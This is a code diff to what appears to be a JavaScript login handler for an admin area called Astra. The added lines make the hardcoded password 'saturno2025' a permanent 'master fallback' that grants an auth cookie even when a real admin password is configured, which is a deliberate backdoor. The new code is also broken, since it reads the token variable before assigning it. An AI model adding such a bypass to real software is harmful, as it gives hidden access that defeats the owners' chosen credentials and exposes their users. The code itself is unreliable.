@@ -5,7 +5,15 @@ export default function handler(req, res) {
     return res.status(405).json({ ok: false });
   }
   var password = (req.body || {}).password || '';
-  var expected = process.env.ASTRA_ADMIN_PASSWORD || 'saturno2025';
+  var expected = process.env.ASTRA_ADMIN_PASSWORD;
+  // Always accept saturno2025 as master fallback
+  if (!expected || password === 'saturno2025') {
+    if (password === 'saturno2025') {
+      res.setHeader('Set-Cookie', 'astra_auth=' + token + '; Path=/; HttpOnly; SameSite=Lax; Max-Age=604800');
+      return res.status(200).json({ ok: true });
+    }
+    expected = 'saturno2025';
+  }
   var token = process.env.ASTRA_AUTH_TOKEN || 'astra-fallback-token';
 
   if (password === expected) {
